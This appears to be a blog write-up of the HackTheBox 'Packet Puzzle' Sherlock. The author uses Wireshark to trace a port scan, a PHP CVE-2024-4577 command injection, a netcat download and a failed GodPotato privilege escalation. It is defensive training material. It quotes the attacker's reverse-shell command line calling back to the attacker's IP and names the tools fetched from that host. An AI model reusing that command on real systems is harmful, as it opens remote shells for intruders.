---
title: Write-Up of Packet Puzzle (HackTheBox Sherlock)
date: 2025-11-13 10:19:20 +/-0000
categories: [Education, Write Ups]
tags: [hackthebox, soc, incident response, network analysis]
author: cblake
description: A short write up of the tasks presented in the Packet Puzzle sherlock on HackTheBox.
comments: false
image:
  path: /assets/img/packetpuzzle/logo.png
  alt: The logo for this HackTheBox challenge.

---

<h2> Overview </h2>
Packet Puzzle is a sherlock on HackTheBox created by Neetrox on the 30th of October 2025. The incident goes as follows; you are an entry level analyst working for a cryptocurrency trading company. You detect suspicious activity on the internal network, which following that you exported a PCAP to look deeper.

Packet Puzzle focuses on network analysis specifically to investigate the incident. The only tool that you will need is some sort of .pcap analyzer such as Wireshark to get the job done.

<h2> Analysis </h2>

1. What is the source IP address of the attacker involved in this attack?
	* To find the source IP address, we can assume that there is going to be some kind of port scan in use here. We can do this my inputting the filter: `tcp.flags.syn == 1 && tcp.flags.ack == 0` into Wireshark, and finding where a source IP address may repeat very requently.
	* Here we see an ip address repeating several times.
	* ![img-description](/assets/img/packetpuzzle/1.png)
	* `192.168.170.128` is the ip address we're looking for.
2.  How many open ports did the attacker discover on the victim's system?
	* Knowing what the attacker's IP address is, we can add on to the Wireshark filter to investigate the ports that DID end up responding to the attacker.
	* A filter like `tcp.flags.syn == 1 && tcp.flags.ack == 1 && ip.src == 192.168.170.130` will do.
	* ![img-description](/assets/img/packetpuzzle/2.png)
	* `8` is our answer.
3. What is the first open port that responded on the victim's system during reconnaissance?
	* Using the same search query, which tells us which ports actually respond, we can just look at the top packet.
	* We see that the port number for the first packet is `22`, which is for ssh
4. What is the CVE Identifier for the vulnerability exploited by the attacker?
	* To investigate this we need to see traffic that actually shows what the attacker is trying to do.
	* The place where I started was by looking at HTTP packets that were sent by the attacker's ip address. This is done with the filter: `http && ipc.src == 192.168.170.128`
	* The very first one is a POST request by the attacker with some sort of command.
	* We can then right-click this packet and select follow to see what is being communicated.
	* We notice that the attacker uses PHP to execute a console command.
	* ![img-description](/assets/img/packetpuzzle/3.png)
	* This is known as  PHP command injection, which has a the CVE ID of `CVE-2024-4577`
5. What is the name and version of the vulnerable product exploited to get RCE?
	* Based off of the information we gathered in the previous task, we can see that the PHP version in use is `8.1.25`
6. What is the username of the victim account?
	* This was also answered in task 4, where we can see the username of the victim account after the attacker executes `whoami`
	* This reveals the username to be `cristo`
7. At what timestamp did the attacker execute the command to gain their initial foothold on the victim system?
	* If we assume that the last PHP command that was executed by the attacker was the payload, we can just go take a look at the final packet.
	* Which we see it here:
	* ![img-description](/assets/img/packetpuzzle/4.png)
	* Since we know this is the command that give the attacker access, we can take the timestamp of this packet.
	* `2025-01-22 09:47:32`
8. What is the MITRE ATT&CK technique ID used by the attacker to gain an initial foothold?
	* There are two things we can note about what occurred to be able to determine the MITRE ATT&CK ID.
		* First, we know that a PHP input validation attack is what was used to gain access.
		* Secondly, we know that PHP is a public-facing application
	* This leaves us with the tactic of 'Exploiting Public-Facing Application' which has an ATT&CK ID of `T1190`
9. What is the name of the malicious executable the attacker downloaded and executed in memory to facilitate privilege escalation on the endpoint?
	* Looking at the objects that we're downloaded via HTTP we know that the attacker used netcat for a reverse shell. We know be seeing the packet that tells us `nc64.exe` was downloaded from the attacker's ip address.
	* With this information we know that we could look for a registered (1024-49151) port that is used frequently AFTER the attacker downloads netcat.
	* We see one port being used frequently, which is 4545.
	* Taking a packet between `192.168.170.130` and `192.168.170.128` with the port of 4545, and following it's traffic we see a command-line interaction.
	* ![img-description](/assets/img/packetpuzzle/6.png)
	* Upon looking through the traffic, we see that there is a `iwr` executed for a program named `GodPotato-NET4.exe`
	* ![img-description](/assets/img/packetpuzzle/7.png)
	* This must be the executable, so `GodPotato-NET4.exe` is our answer.
10. What is the command line used by the attacker while performing privilege escalation?
	* Since the traffic we're seeing is the transmissions between the attacker and the system, we can just continue to inspect it.
	* Here we see another executable being used.
	* ![img-description](/assets/img/packetpuzzle/8.png)
	* `./TimeProvider.exe -cmd "time.exe 192.168.170.128 5555 -e cmd"` is what we're looking for
11. The attacker failed to escalate privileges and was given an error. What is the error?
	* Looking further below this command that was used to attempt to escalate privileges, we see an error. This error reads `Cannot create process Win32Error:2`

<h2> Conclusion </h2>
Packet Puzzle is a great challenge to learn how you can investigate network traffic for attacks. You learn how to identify port scanning, how to assign attacks to CVE identifiers and the MITRE ATT&CK framework, as well as you learn how you can search for netcat traffic. Overall it's a great challenge for anyone entry level like myself.
